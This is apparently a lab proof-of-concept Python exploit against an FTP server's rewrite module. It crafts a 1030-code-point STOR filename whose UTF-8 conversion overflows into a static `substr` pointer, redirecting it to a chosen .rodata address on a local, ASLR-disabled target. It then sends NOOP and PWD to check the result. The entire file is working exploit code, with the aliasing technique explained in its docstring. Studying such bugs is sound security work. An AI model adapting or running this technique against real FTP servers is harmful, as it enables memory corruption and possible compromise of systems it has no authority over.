#!/usr/bin/env python3
"""Point rewrite_parse_map_str's static `substr` at a chosen .rodata string.

utf8_val[1024+k] aliases ucs4_longs[1024+k] at utf8_val[8k], which the second
loop has already overwritten with the low byte of code point 8*k. So code points
0, 8, 16, 24, 32, 40 set the low six bytes of `substr`; the top two zero bytes
are left intact by a 1030-code-point key. Target: 'NOOP command successful' at
0x55555560d4af when PIE base is 0x555555554000 (setarch -R).
"""
import io
import socket
import time
import ftplib

host, port = "127.0.0.1", 21874
for _ in range(40):
    try:
        s = socket.create_connection((host, port), 1); s.close(); break
    except OSError:
        time.sleep(0.25)

tail = ["\u00af", "\u01d4", "`", "U", "U", "U"]  # af d4 60 55 55 55
cps = ["A"] * 1030
for k, ch in enumerate(tail):
    cps[8 * k] = ch
key = "".join(cps)
assert len(key) == 1030
print("KEY_CODEPOINTS=%d KEY_BYTES=%d" % (len(key), len(key.encode("utf-8"))))

ftp = ftplib.FTP()
try:
    ftp.connect(host, port, timeout=8)
    ftp.login("labuser", "labpass")
    ftp.set_pasv(True)
    ftp.sock.settimeout(8)
    print("LOGIN_OK")
    try:
        ftp.storbinary("STOR " + key, io.BytesIO(b"z" * 16))
        print("STOR_SUBSTR_OK")
    except Exception as exc:
        print("STOR_SUBSTR_FAIL %s: %s" % (type(exc).__name__, str(exc)[:140]))
    for cmd in ("NOOP", "PWD"):
        try:
            print(cmd + "=" + str(ftp.voidcmd(cmd))[:100])
        except Exception as exc:
            print(cmd + "_FAIL " + type(exc).__name__ + ": " + str(exc)[:100])
except Exception as exc:
    print("CLIENT_FAIL %s: %s" % (type(exc).__name__, str(exc)[:200]))
finally:
    try:
        ftp.close()
    except Exception:
        pass
